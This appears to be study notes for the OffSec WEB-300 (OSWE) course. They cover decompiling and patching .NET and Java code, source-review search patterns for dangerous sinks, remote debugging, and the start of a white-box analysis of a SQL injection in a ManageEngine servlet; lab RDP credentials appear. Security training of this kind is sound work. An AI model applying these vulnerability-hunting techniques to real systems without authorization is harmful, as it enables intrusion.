---
title: "[OSWE, WEB-300] Instructional notes - Part 1"
date: 2026-03-09
author: "CHW"
tags:
  - offsec
description: "OSWA WEB-300 筆記 Part 1，涵蓋 Managed .NET Code, Decompiling Java Classes 教學、ManageEngine AMUserResourceSyncServlet
servlet SQLi 攻擊。"
---

[OSWE, WEB-300] Instructional notes - Part 1
===


# Table of Contents
[TOC]

# Introduction
現在 Web app：
- Frontend: React / Vue / Angular
- Backend: Java Spring / .NET / PHP / Node
- API Layer
- Microservices
- ORM
- Reverse proxy
- Containerized deployment

這些 framework 疊加在一起。功能達成，但複雜度暴增\
複雜度 = 攻擊鏈可能性上升

>[!Note]
>AWAE Course: Not an entry level course

Whitebox Exploitation:
- 熟悉 Web 技術
- 能讀 JS / PHP / Java / C#
- 理解 server side execution flow

# Tools & Methodologies
可重複、可系統化的 Web 研究方法論

Web 研究和利用可以從 [whitebox](https://en.wikipedia.org/wiki/White-box_testing), [blackbox](https://en.wikipedia.org/wiki/Black-box_testing), 或 [greybox](https://en.wikipedia.org/wiki/Gray-box_testing) 的角度進行\
從 whitebox 視角來看，Web applications 通常比傳統的 compiled applications 更容易被研究和利用，因為 Web applications 是用 interpreted languages 編寫的，無需逆向工程。此外，對於用Java、.NET或 bytecode-based 語言編寫的 web applications，借助專門的工具，也可以輕鬆地將其原始程式碼恢復到接近原始狀態。

## Web Traffic Inspection
透過 traffic inspection 觀察：
- 觀察 real request format
- 了解 parameter encoding
- 分析 session handling
- 分析 CSRF token
- 發現 hidden endpoints

### Burp Suite Proxy
>[!Important]
> >"Learning Burp Suite makes you turn sweet" 
> > [name=CHW]
 
![image](https://hackmd.io/_uploads/Bk7JVpjS-e.png)

- [Burp Suite features ](https://portswigger.net/burp/documentation)

## Interacting with Web Listeners using Python
用 Python 自動化送 request、控 session、控 TLS、控 proxy、再用 Burp 做可視化 debug

在使用 Python 時，經常使用 requests library 與 Web 應用程式互動
- requests 指南（包括[官方文件](https://docs.python-requests.org/en/latest/)）

透過 python3 requests library 發出 HTTP Request：
```py=
#!/usr/bin/env python3
# python3 script.py -u https://target:8443/ -p


import requests
import argparse
from colorama import Fore, Style, init

# init colorama
init(autoreset=True)

# close  TLS warning
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

def format_text(title, item):
    cr = '\r\n'
    section_break = cr + "*" * 20 + cr
    item = str(item)
    text = (
        Style.BRIGHT +
        Fore.RED + title + Fore.RESET +
        section_break +
        item +
        section_break
    )
    return text

def main():
    parser = argparse.ArgumentParser(description="Web Request Script with Optional Proxy")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--proxy", action="store_true", help="Use Burp proxy (127.0.0.1:8080)")
    args = parser.parse_args()

    proxies = None

    if args.proxy:
        proxies = {
            "http":  "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }
        print(Fore.YELLOW + "[*] Proxy enabled (Burp @ 127.0.0.1:8080)")

    try:
        r = requests.get(args.url, verify=False, proxies=proxies)

        print(format_text("r.status_code is: ", r.status_code))
        print(format_text("r.headers is: ", r.headers))
        print(format_text("r.cookies is: ", r.cookies))
        print(format_text("r.text is: ", r.text))

    except requests.exceptions.RequestException as e:
        print(Fore.YELLOW + f"[!] Request failed: {e}")

if __name__ == "__main__":
    main()

```
> - L7 from colorama ...: 將輸出變彩色、好讀
> - L12-15 關閉 TLS 警告: 在目標 Web 使用自簽名憑證的場景中非常有用
> - L17-28 將每個欄位用分隔線印出來
> - L46 會拿到 Response 物件 `r`，常用屬性：
>     - `r.status_code`：HTTP 狀態碼（200/302/401/500…）
>    - `r.headers`：回應 header（Set-Cookie、Server、Content-Type…）
>    - `r.cookies`：requests 解析後的 cookie jar
>    - `r.text`：字串形式的 body（HTML/JSON）
> - `-u` 與 `-p` 自定義目標 URL 與 Proxy

![image](https://hackmd.io/_uploads/Hkax5cFubg.png)

若帶上 `-p` 可在 Burp Suite History 中查看 Response:\
![image](https://hackmd.io/_uploads/r1eWscKOZx.png)

## Source Code Recovery
在 Web 白箱研究中：`Java`, `.NET` 都是編譯後才部署\
但關鍵在於：
- .NET 是 Managed Code
- Java 是 Bytecode

不是 Native binary，也就是若沒有嚴重混淆的情況下，幾乎可以完整還原原始碼

![image](https://hackmd.io/_uploads/BkfHZq9OZg.png)

### Managed .NET Code
.NET managed：編譯成 [IL（Intermediate Language）](https://learn.microsoft.com/en-us/dotnet/standard/managed-code) + metadata
執行時由 CLR/JIT 轉成 machine code\
因為 IL 保留大量資訊（類別、方法、型別、命名空間、屬性），所以.NET 反編譯通常能接近原始碼還原，讀起來像真的 C#

#### 1. dnSpy
使用免費的 dnSpy decompiler 和 debugger 來實作，dnSpy 使用 ILSpy 反編譯器引擎從 .NET 編譯模組中提取原始碼:

>[!Note]
>[dnSpy](https://github.com/dnSpy/dnSpy)：
>- Decompile（反編譯）：把 .dll/.exe 變成可讀 C#
>- Debugger（除錯）：能下 breakpoint、看變數、跟 runtime flow
>- Analyzer（交叉引用）：看某個函式「誰呼叫它」「它呼叫誰」
>- Edit/Compile/Save：直接改 assembly 然後存回去（patch）
>
>dnSpy 底層使用 [ILSpy](https://github.com/icsharpcode/ILSpy) 當 decompiler engine

![image](https://hackmd.io/_uploads/Byc6p55ubg.png)
```
xfreerdp3 /v:dnn /u:administrator /p:studentlab /cert:ignore /sec:rdp /size:1180x708
```
![image](https://hackmd.io/_uploads/S1cpyoqOZg.png)

🎯：用一個最小 C# 程式 → 編譯成 exe → 拿 dnSpy 還原 → 理解工作流


使用 Notepad++ 在 Windows 桌面上建立一個文字文件，程式碼如下：\
將檔案儲存為 `test.cs`
```C#
using System;

namespace dotnetapp
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("What is your favourite Web Application Language?");
            String answer = Console.ReadLine();
            Console.WriteLine("Your answer was: " + answer + "\r\n");
        }
    }
}
```
> 最基本的 C# Console Application
> - `using System;`: System 是 .NET 的核心 Namespace (如果沒有 using System，就必須寫成 `System.Console.WriteLine();`)
> - `static void Main(string[] args)`: Entry Point
>    - static: 不需要建立物件即可執行
>    - void: 無回傳值
>    - Main: 主函式名稱（固定）
>    - string[] args: 命令列參數
> - `String answer = Console.ReadLine();`: 讀取使用者從 stdin 輸入的一整行字串
> > 在 .NET 6 以上通常會寫成 `string answer`

![image](https://hackmd.io/_uploads/SJANEi9OZl.png)


為了編譯，將使用 .NET 框架中的 csc.exe 編譯器
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe test.cs
```
![image](https://hackmd.io/_uploads/BkhFbaqubg.png)

測試編譯後的 `test.exe`\
![image](https://hackmd.io/_uploads/SygEn-6c_bx.png)

可以打開 dnSpy 並嘗試反編譯這個可執行檔的程式碼\
![image](https://hackmd.io/_uploads/ByqLKTqdbg.png)

`test.exe` → `dotnetapp` → `Program` 可以看到 dnSpy 反編譯 test.exe\
![image](https://hackmd.io/_uploads/B1L3tT9_Zg.png)

#### 2. Cross-References
Cross-Reference 交叉引用本質是回答兩個問題：
> 誰呼叫了這個函式？（Callers）
> 這個函式呼叫了誰？（Callees）

在 dnSpy 裡對應：
> Used By → 誰用到這個函式
> Uses → 這個函式用到誰

在分析和 debug 更複雜的應用程式時，反編譯器最有用的功能之一是能夠找到指向特定變數或函數的 [cross-references](https://en.wikipedia.org/wiki/Cross-reference)\
可以利用交叉引用來更好地理解程式碼邏輯，設定關鍵 [breakpoints](https://en.wikipedia.org/wiki/Breakpoint) 來偵錯和檢查目標應用程式，追查 data flow

以 DotNetNuke (ASP.NET WebApp) 為例，核心邏輯在 DLL
![image](https://hackmd.io/_uploads/SyaCg0c_-e.png)
> Burp Suite 截取的 HTTP request 中存在一些 Base64 encode 的值\
> 為了更了解這些值在應用程式中的解碼和處理位置，可以假設所有處理 Base64 編碼值的函數都包含 "base64" 這個詞

在 dnSpy 中開啟 `C:\inetpub\wwwroot\dotnetnuke\bin\DotNetNuke.dll`
![image](https://hackmd.io/_uploads/Hyv8ZRcu-x.png)

在 DotNetNuke.dll 中搜尋 "base64" 並選擇尋找 Method\
![image](https://hackmd.io/_uploads/Hy6bfR5OZx.png)
> 可以找到 Base64UrlDecode function
> ![image](https://hackmd.io/_uploads/HkB_zAq_Wx.png)

利用找到的 Base64UrlDecode function 選擇 Analyze\
![image](https://hackmd.io/_uploads/HywszA5dbl.png)

Used By → 誰用到這個函式\
Uses → 這個函式用到誰\
![image](https://hackmd.io/_uploads/Hkkn8Rqu-l.png)
> 透過 Used By 可以追查到 IsValidSignature 使用到 Base64UrlDecode function

WHY Cross-References ?\
透過 Cross-References 推進漏洞分析，Decode 後的 decoded 變數被用在哪
![image](https://hackmd.io/_uploads/rJaMj0qO-e.png)

#### 3. Modifying Assemblies
如何任意修改 Assemblies
在 .NET 中，`.exe` / `.dll` 不是純 machine code\
包含了：
- IL（Intermediate Language）
- Metadata（型別、方法、屬性資訊）

dnSpy 可以`反編譯成 C#`、`修改 C#`、`重新編譯成 IL`、`存回原始 assembly`
👉🏻 可以 patch compiled 程式

回到上述建立的 test.exe 為例：\
在 Program 點擊 Edit Class (C#)\
![image](https://hackmd.io/_uploads/rkNa2Rq_bx.png)

將 "Your answer was:" 改成 "You said"\
![image](https://hackmd.io/_uploads/B1OUaA5O-l.png)

測試成果：
![image](https://hackmd.io/_uploads/ryFS00cdbx.png)

### Decompiling Java Classes
如何把 Java WebApp 的 JAR 還原成可閱讀的原始碼，並建立後續白箱分析

Java WebApp（例如 ManageEngine、Spring、Struts）通常部署為：
- .class 檔案（Java bytecode）
- 打包成 .jar
- Web 環境常見 .war

JAR 本質是：`ZIP 壓縮檔 + class files + META-INF`
所以 Java 不是 native machine code，而是 JVM bytecode

#### 1. 建立 JAR

測試 JAR 檔案來示範 JD-GUI 中的反編譯過程:\
在 Kali 機器上建立 JAR/test.java 

```java
import java.util.*;

public class test{
	public static void main(String[] args){
		Scanner scanner = new Scanner(System.in);
		System.out.println("What is your favorite Web Application Language?");
		String answer = scanner.nextLine();
		System.out.println("Your answer was: " + answer);
	}
}
```
需要用到 Java Development Kit (JDK) 來編譯 Java 原始碼\
可以使用`sudo apt install default-jdk` 在 Kali 系統中安裝

```
javac -source 1.8 -target 1.8 test.java
```
> - `javac`: Java compiler
> - `-source 1.8`: 原始碼語法版本
> - `-target 1.8`: 產生的 bytecode 相容 JVM 1.8

(if JDK 9+)
```
javac --release 8 test.java
```
![image](https://hackmd.io/_uploads/SJhEvki_Wg.png)

產出的 test.class 是 Java bytecode（JVM instruction set）不是原始碼

編譯原始碼後，`test.class` 檔案會被寫入當前目錄\
為了將這個 class 打包成 JAR 文件 (因為 JVM 不知道 entry point)，需要建立一個清單檔案\
可以透過建立 `JAR/META-INF` 目錄並將測試類別新增至 `MANIFEST.MF` 檔案中

>[!Important]
>為什麼要 Manifest？\
> JAR 若要用 `java -jar test.jar`，必須在 META-INF/MANIFEST.MF 指定 `Main-Class: test`\
> 否則 JVM 不知道 entry point。

![image](https://hackmd.io/_uploads/r16TckiO-x.png)

建立 JAR:
```
jar cmvf META-INF/MANIFEST.MF test.jar test.class
```
> - `c`: create
> - `m`: include manifest
> - `v`:  verbose
> - `f`: file name
> > 將 test.class + manifest 壓縮成 test.jar

![image](https://hackmd.io/_uploads/HyFjh0sdZe.png)

驗證 JAR:\
JVM 解壓 JAR → 讀 manifest → 找到 Main-Class → 執行 main()
```
java -jar test.jar
```
![image](https://hackmd.io/_uploads/H1A7pAjubl.png)

#### 2. JD-GUI 中的 decomplie
>[!Note]
> [JD-GUI](https://java-decompiler.github.io/) 是一款獨立的圖形化 Java 反編譯工具，用於將編譯後的 .class 或 .jar 檔案轉換回可閱讀的 Java 原始碼。它是 Java Decompiler project 的核心應用之一，被廣泛用於軟體逆向工程、程式碼分析與安全研究。
>> JD-GUI 可將 Java 位元碼即時反編譯為對應的原始碼，支援 `.class`、`.jar`、`.war`、`.ear` 等封裝格式。使用者可透過圖形介面瀏覽類別階層、方法與欄位，並能將反編譯後的程式碼儲存為 .java 檔案。它同時支援拖放操作與關鍵字搜尋，使程式碼探索更高效。


既然 JAR 檔案可以正常運作，接著複製到執行 JD-GUI 的機器上 ( Windows VM)\
使用 Impacket 透過 SMB 協定傳送:
```
sudo impacket-smbserver chw .
```
![image](https://hackmd.io/_uploads/BJNzCk2_-x.png)

(Windows)\
透過 RDP 登入 windows 存取 Kali SMB
![image](https://hackmd.io/_uploads/SyHW-1ouWl.png)
```
xfreerdp3 /v:manageengine /u:administrator /p:studentlab /cert:ignore /sec:rdp /size:1180x708
```
![image](https://hackmd.io/_uploads/Hko2C12OZg.png)

將 test.jar 複製到桌面，並開啟 JD-GUI

JD-GUI 反編譯原理:
- 讀 .class
- 解析 constant pool
- 重建 control flow graph
- 還原成 Java 語法

Java bytecode 很高階：
- class metadata 保留
- method 名稱保留
- 型別保留

![image](https://hackmd.io/_uploads/rkTkxlhuZl.png)
與先前使用 dnSpy 進行的 cross-reference analysis 類似，也可以使用 JD-GUI 在反編譯後的類別中搜尋任意方法和變數

找一個複雜一點的 JAR 測試 cross-reference analysis:\
開啟 `C:\Program Files (x86)\ManageEngine\AppManager12\working\classes\AdventNetAppManager.jar`\
透過 Search 可以搜尋任意字串 (Ex. `servlet`)\
![image](https://hackmd.io/_uploads/rJ5sBg2uZg.png)

但 JD-GUI 內建無 cross-reference tree、無 Used By / Uses，UI 對大型專案不好用、無內建 debugger

>[!Tip]
> Java 常見漏洞：\
>![image](https://hackmd.io/_uploads/By7UxghdZl.png)

## Source Code Analysis Methodology
現代 Web application 大量使用了第三方框架：
- 第三方 framework（Spring、ASP.NET MVC、Struts）
- ORM（Hibernate、Entity Framework）
- 中介層（Filter、Middleware、Interceptor）
- Template engine
- Security library

真正的 data flow 常被許多 framework 抽象化

### An Approach to Analysis
分析 source code 時，需要注意資料的 sources 和 sinks。資料透過資料來源進入應用程序，並在資料接收器中使用（或進行處理）。

進行手動原始碼分析的方法會根據選擇從檢查來源端還是目標端開始而有所不同:
- Top-Down
```
HTTP Request
 → Controller
 → Business Logic
 → Sink
```
首先會確定攻擊源，若沒有經過身份驗證的 Web 應用程式存取權限，顯然會先在未經身份驗證的資源中尋找漏洞。透過追蹤應用程式的流量流向各個目標，嘗試識別任何敏感功能，並確定已部署的控制措施

- Bottom-Up
更有可能發現嚴重性較高但暴露較低的漏洞
```
Dangerous sink
 → Who calls it?
 → Who supplies variable?
 → HTTP source
```
首先要辨識目標接收器（sink）。目標是確定是否存在漏洞，以及存在漏洞的程式碼使用了哪些變數或值。然後需要確定應用程式如何呼叫存在漏洞的函數，並將應用程式流程追溯到來源。與 Top-Down 的方法一樣，需要注意任何可能影響利用漏洞函數所需有效載荷的過濾器或輸入清理措施

>[!Note]
>為什麼 Bottom-Up 常出高嚴重性？
>>直接從 `exec()`, `deserialize()`, `File.write()`, `SQL.execute()` 開始鎖定的就是真正 dangerous operation

### Using an IDE
如何用 [integrated development environment](https://en.wikipedia.org/wiki/Integrated_development_environment) (IDE)  建立高效率的白箱分析流程

若透過搜尋 (Ex. `grep -R`) 會得到大量雜訊。但整合開發環境 (IDE) 是強大的原始碼分析工具，大多數 IDE 都能執行高階程式碼搜尋和偵錯，能做到語意搜尋（symbol-level）、交叉引用、正規表示式搜尋、多檔案過濾等等

(透過 Search 搜尋)\
![image](https://hackmd.io/_uploads/rJj-6z2OZe.png)

(透過 Find All References 搜尋)\
![image](https://hackmd.io/_uploads/S1BWjG2dbl.png)

>[!Note]
>Source Code Analysis 搜尋技巧:
>- request parameter: `getParameter\s*\(`
>- SQL CONCAT: `SELECT.*\+`
>- command execution: `Runtime\.getRuntime\(\)\.exec`
>- Java  deserialization: `ObjectInputStream`
>- .NET deserialization: `BinaryFormatter`


### Common HTTP Routing Patterns
HTTP 請求進來後，程式是怎麼決定執行哪段程式碼的 (File System Routing maps the URL)

#### - Web document root
![image](https://hackmd.io/_uploads/SytpMQ2ubg.png)

#### - Java Servlet Mapping（web.xml routing）
老派 Java Web App 常見在 `WEB-INF/web.xml` 定義 routing\
(範例)
```xml
<!-- SubscriptionHandler-->
<servlet id="SubscriptionHandler">
  <servlet-name>SubscriptionHandler</servlet-name>
  <servlet-class>org.opencrx.kernel.workflow.servlet.SubscriptionHandlerServlet</servlet-class>
	</servlet>
...
<servlet-mapping>
  <servlet-name>SubscriptionHandler</servlet-name>
	<url-pattern>/SubscriptionHandler/*</url-pattern>
</servlet-mapping>
```
> `/SubscriptionHandler/*` 全部交給 `SubscriptionHandlerServlet`

若看到 `POST /SubscriptionHandler/doSomething`:
- 打開 web.xml
- 找 url-pattern
- 找 servlet-class
- 打開那個 class
- 找 `doGet()` / `doPost()`

#### - ExpressJS Routing（Node.js）
ExpressJS 直接在原始碼中包含路由資訊\
(範例)
```js
var express = require('express');
var router = express.Router();
...

router.get('/login', function(req, res, next) {
  res.render('login', { title: 'Login' });
});
```
> GET /login 呼叫 `function(req,res,next)`

若看到 `POST /login` 應該搜尋:
- `router.post('/login'`
- `app.post('/login'`

#### - Annotation Routing（[Spring MVC](https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/mvc.html#mvc-controller) / [Flask](https://flask.palletsprojects.com/en/1.1.x/quickstart/#routing)）
現代框架最常見模式，透過註解或屬性進行路由
```java
@GetMapping({"/admin/users"})
public String getUsersPage(HttpServletRequest req, Model model, HttpServletResponse res) {
...
```
> GET /admin/users 呼叫 `getUsersPage()`

若看到 `GET /admin/users` 應該在 IDE 搜尋：
- `@GetMapping("/admin/users")`
- `@RequestMapping`
- `@PostMapping(` ...etc

>[!Tip]
>Routing 對漏洞分析的重要性:
>例如 `@GetMapping("/admin/deleteUser")` 若沒有 `@PreAuthorize` 或 `if (!isAdmin)`
>> 可能發覺未授權高權限操作

### Analyzing Source Code for Vulnerabilities
自動化 SAST 工具可以識別明顯漏洞，但常有大量 false positive、無法理解複雜邏輯流程、無法理解 business logic flaw、看不懂 framework abstraction 等問題需要透過手動程式碼分析解決

常見高 Priority 分析:
- 未登入區域（Unauthenticated）
    - 曝光面最大、可直接利用
    - `@GetMapping(`, `@PostMapping(`
- 已登入區域（Authenticated）
    - 常被忽略
    - admin 常有任意檔案讀寫、Command execution、Backup restore、Import/export 等功能
- 輸入過濾機制（Sanitization）
    - 用標準 library？還是自寫 regex？有沒有 double decode？是 encode 還是 strip
- 資料庫查詢建構方式
    - 是否使用 PreparedStatement？是否 string concatenation？
    - ![image](https://hackmd.io/_uploads/BykkYVnO-l.png)
- 帳號建立 / 密碼重設流程
    - Token 可預測或未綁定使用者、重設流程可跳步驟、驗證碼未檢查
- 與 OS 互動
    - `exec(`, `ProcessBuilder(`, `File(`, `Runtime.getRuntime()` ...etc
    - 在 .NET : `Process.Start(`, `File.ReadAllText(`, `BinaryFormatter(`

## Debugging
是透過 debugger 運行，可以檢查 application memory 和 call stacks。這些資訊在編寫漏洞程式時很重要，一些 debuggers 支援在遠端系統運行 debug，這被稱為 remote debugging。

(範例)\
利用簡單的 Java code 當作範例：
在 VScode 安裝兩個 java debug plugins\
![image](https://hackmd.io/_uploads/BkOI1S2uZx.png)\
![image](https://hackmd.io/_uploads/r1ldJr3_-x.png)

透過以下猜數字的 Java code:
```java
import java.util.Random;
import java.util.Scanner;

public class DebuggerTest {

  private static Random random = new Random();
  public static void main(String[] args){
    int num = generateRandomNumber();
		Scanner scanner = new Scanner(System.in);
		System.out.println("Guess a number between 1 and 100.");
		try{
      int answer = scanner.nextInt();
      scanner.close();
      System.out.println("Your guess was: " + answer);
      if(answer == num) {
        System.out.println("You are correct!");
      } else {
        System.out.println("Incorrect. The answer was " + num);
      }
    } catch(Exception e) {
      System.out.println("That's not a number.");
    } finally {
      scanner.close();
    }
    System.exit(0);
  }

  public static int generateRandomNumber() {
    return random.nextInt(100)+1;
  }
}
```
設定 L8 為斷點，並執行 Run and Debug
![image](https://hackmd.io/_uploads/HkJPZSh_Ze.png)

Debugger 按鈕分別為 Continue, Step Over, Step Into, Step Out, Restart, Stop, 和 Hot Code Replace

按下 Step Over 已暫停執行 L9，變數視窗已更新並顯示 num 變數的值，即可預測正確的數字\
![image](https://hackmd.io/_uploads/ByDufr3_Zx.png)

### Remote Debugging
Remote Debugging 允許在不同系統上運行的 process debug，只要能夠存取遠端系統上的 source code 和 debugger port 即可。
```
VS Code (Debugger)
        ↓ 透過 TCP
Target JVM (NumberGame.jar)
```
JVM 透過 JDWP（Java Debug Wire Protocol）開啟 debug socket。
VS Code 連線到該 socket，然後可以設 breakpoint、查看變數、追蹤呼叫堆疊、暫停執行等等

- 建立 launch.json
VS Code 會產生 `.vscode/launch.json`\
Add Configuration 新增 Java: Attach to Remote Program 
```json
{
  "type": "java",
  "name": "Attach to Remote Program",
  "request": "attach",
  "hostName": "127.0.0.1",
  "port": 9898
}
```
配置好 launch.json 後，啟動 JAR\
`-agentlib:jdwp` 參數啟用 Java Debug Wire Protocol
```
java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9898 -jar NumberGame.jar
```
> - `transport=dt_socket`: 使用 TCP socket 傳輸 debugger traffic
> - `server=y`: JVM 當作 debug server，等待 debugger 連線
> - `suspend=n`: JVM 不會在啟動時暫停

![image](https://hackmd.io/_uploads/BJvk3N6uZl.png)

# ManageEngine Applications Manager AMUserResourcesSyncServlet SQL Injection RCE

深入分析並利用 ManageEngine AMUserResourceSyncServlet
 servlet 中發現的 SQL injection，可用於取得對底層作業系統的存取權限。也探討如何審核已編譯的 Java servlet 以偵測類似的嚴重漏洞。
 
## Vulnerability Discovery

[環境範例]\
瀏覽 `https://manageengine:8443/` Web 頁面：\
![image](https://hackmd.io/_uploads/S1S-aO6_-x.png)

(Admin login)\
![image](https://hackmd.io/_uploads/Hk9lROT_be.png)


當審核一個不熟悉的 Web 應用程式時，首先需要熟悉目標並了解其暴露的攻擊面\
以 ManageEngine 的應用程式管理器介面為例，可以看到 URI 都帶有 `.do` 副檔名。
搜尋相關資訊 ([.DO File Extension](https://fileinfo.com/extension/do)) `.do` 副檔名通常是已編譯 Java 的 URL mapping scheme \
![image](https://hackmd.io/_uploads/ryiiTup_Zx.png)

>[!Note]
>`.do` 在 Java 世界觀通常代表：
> - Struts mapping
> - Servlet mapping
> - Action mapping
>> URL 並不是對應靜態檔案而是 mapping 到 compiled Java class\
>> ![image](https://hackmd.io/_uploads/S1sTCdTOZx.png)


### Servlet Mappings

RDP 進入 Windows 用 Process Explorer 確認 Java process

>[!Tip]
>**Process Explorer**:\
Process Explorer 是由 Microsoft Sysinternals 開發的一款高階系統監控工具，用於在 Microsoft Windows 環境中查看、管理與分析正在執行的程序與系統資源。它提供比內建「工作管理員」更詳盡的資訊，因此常被系統管理員與資安專業人士用於問題診斷與惡意軟體分析。

```
xfreerdp3 /v:manageengine /u:administrator /p:studentlab /cert:ignore /sec:rdp /size:1180x708
```
在 Process Explorer 中可以看到執行中的 Java process，且路徑在 `C:\Program Files\ManageEngine\AppManager12\working\`\
![image](https://hackmd.io/_uploads/rkUjLYpO-l.png)

顯示的 Working Directory 也很可能就是 WebApp 的 deployment root

🧠：得知 working directory 能做什麼？\
Java WebApp 通常有 WEB-INF/ 可以查看 `web.xml`(routing configuration), `classes/`, `lib/`

### Source Code Recovery
🎯 如何在大型 Java 企業級應用中，有策略的恢復並篩選可疑原始碼

儘管檢測任何類型的漏洞都不是一件容易的事，但能夠查看應用程式原始碼無疑可以加快這一過程。正如我們在初步審查中發現的那樣，ManageEngine 應用程式管理器的至少部分元件是用 Java 編寫的，且編譯後的 Java classes 可以使用公開可用的軟體反編譯。

確定要審查哪些 Java classes

透過檢查`C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\lib`目錄的內容，發現很多 JAR 檔案。透過檔名可以看出大多是第三方 libraries (Ex. `struts.jar` 或 `xmlsec-1.3.0.jar`)\
其中目錄下只有四個 JAR 檔案可能是 ManageEngine 的原生檔案。先挑選 `AdventNetAppManagerWebClient.jar` 檔名相對直觀
![image](https://hackmd.io/_uploads/rygxB96_Wg.png)

使用 JD-GUI decompiler:
![image](https://hackmd.io/_uploads/S1LL_cTuZe.png)

🧠：幾千個 classes，怎麼找漏洞？

透過 JD-GUI decompiler 後，開始尋找漏洞。但 JD-GUI search capabilities 不好用，需要將 source code 儲存並轉移到 Notepad++
```
File > Save All Sources
```
![image](https://hackmd.io/_uploads/SJZBdM4KWx.png)

### Analyzing the Source Code
#### - 搜尋 SELECT
以上 `找到對應 servlet`、`反編譯 JAR`、`匯出 .java 檔`、`建立搜尋工具鏈`\
接著進入：`漏洞追蹤`

大致瀏覽 source code 看到大量用到 SQL query\
![image](https://hackmd.io/_uploads/S16JJX4Y-e.png)

既然知道：
- 應用一定連資料庫
- ‼️ Java legacy app 很常 string concatenation

先尋找所有 SQL query
透過 為什麼用 Regex 找出 
- 同一行包含 query + select
- 可能使用字串拼接的查詢 (`+`)
```
^.*?query.*?select.*?
```
![image](https://hackmd.io/_uploads/rJzn_QVKbx.png)
> 光 JAR 檔案就找到 4879 筆 SELECT query

>[!Important]
>Entry-Point Driven Analysis:\
>不一定會從 SQL 開始，而是從入口開始

#### - HTTP Handler 開始
Java Servlet 有固定模式：
- `doGet`
- `doPost`
- `doPut`
- `doDelete`
- `doCopy`
- `doOptions`

這即是所有 HTTP 請求的入口

尋找 `doGet` 與 `doPost`
- doGet
![image](https://hackmd.io/_uploads/Sy0c2mVtWl.png)\
`doGet` 找到 87 instances 

- doPost
![image](https://hackmd.io/_uploads/Sk8AhQ4KWg.png)\
`doPost` 找到 53 instances  

針對 doGet 開始追蹤資料流\
![image](https://hackmd.io/_uploads/SkjqQN4Y-g.png)


AMUserResourcesSyncServlet class
```
protected void doGet(HttpServletRequest req, HttpServletResponse resp)
```
![image](https://hackmd.io/_uploads/rJO8UUNFWe.png)

req 參數是 HttpServletRequest object，包含 clent 向 Web 的 request； resp 參數是 HttpServletResponse object，包含 servlet 在處理 request 的 response

從攻擊者角度來看，可以特別關注 HttpServletRequest object，因為這是我們可控的部分: 透過 getParameter 或 getParameterValues 方法來提取 HTTP 請求參數的 servlet 程式碼\
`C:\Users\Administrator\Desktop\AdventNetAppManagerWebClient.jar.src\com\adventnet\appmanager\servlets\AMUserResourcesSyncServlet` :
```java=18
/*     */ public class AMUserResourcesSyncServlet
/*     */   extends HttpServlet
/*     */ {
/*     */   public void doPost(HttpServletRequest request, HttpServletResponse response)
/*     */     throws ServletException, IOException
/*     */   {
/*  24 */     doGet(request, response);
/*     */   }
/*     */   
/*     */   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
/*     */   {
/*  29 */     response.setContentType("text/html; charset=UTF-8");
/*  30 */     PrintWriter out = response.getWriter();
/*  31 */     String isSyncConfigtoUserMap = request.getParameter("isSyncConfigtoUserMap");
/*  32 */     if ((isSyncConfigtoUserMap != null) && ("true".equals(isSyncConfigtoUserMap)))
/*     */     {
/*  34 */       fetchAllConfigToUserMappingForMAS(out);
/*  35 */       return;
/*     */     }
/*  37 */     String masRange = request.getParameter("ForMasRange");
/*  38 */     String userId = request.getParameter("userId");
/*  39 */     String chkRestrictedRole = request.getParameter("chkRestrictedRole");
/*  40 */     AMLog.debug("[AMUserResourcesSyncServlet::(doGet)] masRange : " + masRange + ", userId : " + userId + " , chkRestrictedRole : " + chkRestrictedRole);
/*     */     
/*  42 */     if ((chkRestrictedRole != null) && ("true".equals(chkRestrictedRole)))
/*     */     {
/*  44 */       boolean isRestricted = RestrictedUsersViewUtil.isRestrictedRole(userId);
/*  45 */       out.println(isRestricted);
/*     */ 
/*     */ 
/*     */     }
/*  49 */     else if (masRange != null) {
/*  50 */       if ((userId != null) && (!"".equals(userId)))
/*     */       {
/*  52 */         fetchUserResourcesofMASForUserId(userId, masRange, out);
/*     */       }
/*     */       else
/*     */       {
/*  56 */         fetchAllUserResourcesForMAS(masRange, out);
/*     */       }
/*     */     }
/*     */     else {
/*  60 */       AMLog.debug("[AMUserResourcesSyncServlet::(doGet)] Improper mas range is given");
/*     */     }
/*     */   }
/*     */   
```
> - 在 Java Servlet 架構中：
>    - doGet() → 處理 HTTP GET 請求
>    - doPost() → 處理 HTTP POST 請求\
>    (在 servlet 實作中，用單一方法處理多個 HTTP method 的做法非常常見)
> - doPost 行為
>    - `doGet(request, response);`: 所有 POST 請求都轉交給 doGet 處理 
> - doGet 方法
>    - `response.getWriter();`: 取得 HTTP Response 的輸出
>    - `request.getParameter(" any ");`: 取得使用者輸入\
> - 條件判斷
>    - `if (isSyncConfigtoUserMap != null && "true".equals(isSyncConfigtoUserMap))`: 檢查 isSyncConfigtoUserMap=true
>    - `if (chkRestrictedRole != null && "true".equals(chkRestrictedRole))`: 如果傳 chkRestrictedRole=true 就不會走 SQL 查詢邏輯

```
HTTP Request
    ↓
doGet()

if isSyncConfigtoUserMap=true
    → fetchAllConfigToUserMappingForMAS()
    → return

else if chkRestrictedRole=true
    → RestrictedUsersViewUtil.isRestrictedRole()
    → print result

else if masRange exists
    if userId exists
        → fetchUserResourcesofMASForUserId()
    else
        → fetchAllUserResourcesForMAS()

else
    → log error
```

其中可控變數 `isSyncConfigtoUserMap`, `ForMasRange`, `userId`, `chkRestrictedRole`，且可以看出 `fetchUserResourcesofMASForUserId(userId, masRange, out);` 可能有漏洞發生，userId 直接來自 request、未經過 parseInt、未過濾、被用於 SQL 拼接

🧠：建構 payload request: `ForMasRange=任意值 userId=payload`\
且要避免 `isSyncConfigtoUserMap=true chkRestrictedRole=true`

先透過 JD-GUI 觀察 userId 其他用途：\
![image](https://hackmd.io/_uploads/ByimrdNY-x.png)

除了在 doGet function 使用外，userId 也被用於在 fetchUserResourcesofMASForUserId function 中建構 SELECT
查詢
